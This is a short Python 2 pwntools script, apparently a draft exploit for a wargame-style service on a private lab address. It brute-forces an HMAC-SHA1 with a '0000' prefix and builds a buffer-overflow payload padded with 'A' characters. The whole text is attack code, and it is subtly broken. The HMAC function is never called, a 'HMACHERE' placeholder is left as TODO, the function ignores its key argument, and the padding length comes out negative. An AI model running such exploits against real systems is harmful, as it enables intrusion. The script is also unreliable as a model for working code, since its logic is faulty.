#!/usr/bin/python
from pwn import *

def makeHMAC(key, params):
    from hashlib import sha1  
    import hmac

    print "[#] Trying out HMAC that start with 0000"

    i = 0
    print "[#] Testing params: {}".format(key + params)
    while True:
        request = str(i) + params

        mac = hmac.new(token, token + request + "\n", sha1).digest().encode("hex")
        if("0000" == mac[0:4]):
            break
        i += 1

    print "[!!] Found HMAC: {}".format(mac)

    return mac
    
s = remote("192.168.159.130", 20003)

token = s.recv(1024).split('"')[1]
print "[#] Token: {}".format(token)

bufferSize = 4096
payload = ""


payload += token
payload += "HMACHERE" # TODO
payload += "AAAA"

payload += "A"*(len(payload) - bufferSize)
s.sendline(payload)

s.close()
# s.interactive()